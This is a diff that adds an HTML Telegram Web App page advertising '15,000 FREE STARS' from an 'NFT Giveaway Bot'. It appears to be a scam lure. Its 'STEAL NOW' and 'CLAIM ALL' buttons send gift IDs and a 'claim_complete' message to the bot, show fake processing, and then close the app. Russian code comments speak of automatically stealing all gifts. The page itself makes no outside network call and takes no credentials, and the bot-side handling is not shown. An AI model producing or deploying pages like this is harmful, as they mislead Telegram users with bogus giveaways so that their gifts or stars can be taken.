@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Stars - Claim Your Gift</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a1f35 0%, #0d1117 100%);
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: rgba(30, 35, 55, 0.8);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
+            padding: 30px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .stars-animation {
+            font-size: 64px;
+            margin: 20px 0;
+            animation: float 3s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0) rotate(0); }
+            50% { transform: translateY(-15px) rotate(5deg); }
+        }
+        
+        .gift-card {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 16px;
+            padding: 20px;
+            margin: 15px 0;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .gift-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+            animation: shine 3s infinite;
+        }
+        
+        @keyframes shine {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+        
+        .steal-btn {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 12px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 5px;
+            transition: transform 0.2s;
+        }
+        
+        .steal-btn:active {
+            transform: scale(0.95);
+        }
+        
+        .progress-bar {
+            height: 6px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 3px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #4facfe 0%, #00f2fe 100%);
+            width: 0%;
+            transition: width 1s ease;
+        }
+        
+        .gift-stolen {
+            background: rgba(76, 175, 80, 0.2);
+            border: 1px solid #4CAF50;
+        }
+        
+        .claim-all-btn {
+            background: linear-gradient(135deg, #43e97b 0%, #38f9d7 100%);
+            color: black;
+            border: none;
+            padding: 16px 32px;
+            border-radius: 16px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+        }
+        
+        .counter {
+            font-size: 24px;
+            font-weight: bold;
+            text-align: center;
+            margin: 20px 0;
+            color: #FFD700;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .spinner {
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top: 3px solid #fff;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🎁 Telegram Stars</h1>
+            <div class="stars-animation">⭐</div>
+            <h2>15,000 FREE STARS</h2>
+            <p>From: <b>NFT Giveaway Bot</b></p>
+        </div>
+        
+        <div class="counter">
+            <span id="stars-count">15,000</span> ⭐
+        </div>
+        
+        <div class="progress-bar">
+            <div class="progress-fill" id="steal-progress"></div>
+        </div>
+        
+        <div id="gifts-container">
+            <h3>Available Gifts:</h3>
+            <div class="gift-card" id="gift-1">
+                <h4>🎨 Premium NFT Collection #1</h4>
+                <p>Value: 5,000 stars</p>
+                <button class="steal-btn" onclick="stealGift(1)">STEAL NOW</button>
+            </div>
+            
+            <div class="gift-card" id="gift-2">
+                <h4>🌟 Exclusive Stars Pack</h4>
+                <p>Value: 7,000 stars</p>
+                <button class="steal-btn" onclick="stealGift(2)">STEAL NOW</button>
+            </div>
+            
+            <div class="gift-card" id="gift-3">
+                <h4>💎 Diamond Bonus Pack</h4>
+                <p>Value: 3,000 stars</p>
+                <button class="steal-btn" onclick="stealGift(3)">STEAL NOW</button>
+            </div>
+        </div>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Processing your gifts...</p>
+        </div>
+        
+        <button class="claim-all-btn" onclick="claimAllGifts()" id="claim-btn">
+            🚀 CLAIM ALL 15,000 STARS
+        </button>
+    </div>
+
+    <script>
+        let stolenGifts = [];
+        let totalGifts = 3;
+        
+        // Инициализация Telegram WebApp
+        window.addEventListener('DOMContentLoaded', (event) => {
+            Telegram.WebApp.ready();
+            Telegram.WebApp.expand();
+            Telegram.WebApp.enableClosingConfirmation();
+        });
+        
+        function stealGift(giftId) {
+            if (stolenGifts.includes(giftId)) return;
+            
+            stolenGifts.push(giftId);
+            document.getElementById(`gift-${giftId}`).classList.add('gift-stolen');
+            
+            // Отправка данных в бота
+            Telegram.WebApp.sendData(JSON.stringify({
+                action: 'gift_stolen',
+                gift_id: giftId,
+                timestamp: Date.now()
+            }));
+            
+            // Обновление прогресса
+            updateProgress();
+        }
+        
+        function updateProgress() {
+            const progress = (stolenGifts.length / totalGifts) * 100;
+            document.getElementById('steal-progress').style.width = `${progress}%`;
+            
+            // Обновляем счетчик
+            const stolenValue = stolenGifts.length * 5000;
+            document.getElementById('stars-count').textContent = (15000 - stolenValue).toLocaleString();
+        }
+        
+        function claimAllGifts() {
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('claim-btn').style.display = 'none';
+            
+            // Автоматически крадем все подарки
+            for (let i = 1; i <= totalGifts; i++) {
+                if (!stolenGifts.includes(i)) {
+                    stealGift(i);
+                }
+            }
+            
+            // Имитация обработки
+            setTimeout(() => {
+                // Отправляем финальные данные в бота
+                Telegram.WebApp.sendData(JSON.stringify({
+                    action: 'claim_complete',
+                    total_gifts: totalGifts,
+                    stolen_gifts: stolenGifts,
+                    stars_claimed: 15000
+                }));
+                
+                // Закрываем WebApp через 2 секунды
+                setTimeout(() => {
+                    Telegram.WebApp.close();
+                }, 2000);
+                
+            }, 3000);
+        }
+        
+        // Обработка ошибок
+        Telegram.WebApp.onEvent('viewportChanged', function(e) {
+            console.log('Viewport changed:', e);
+        });
+    </script>
+</body>
+</html>
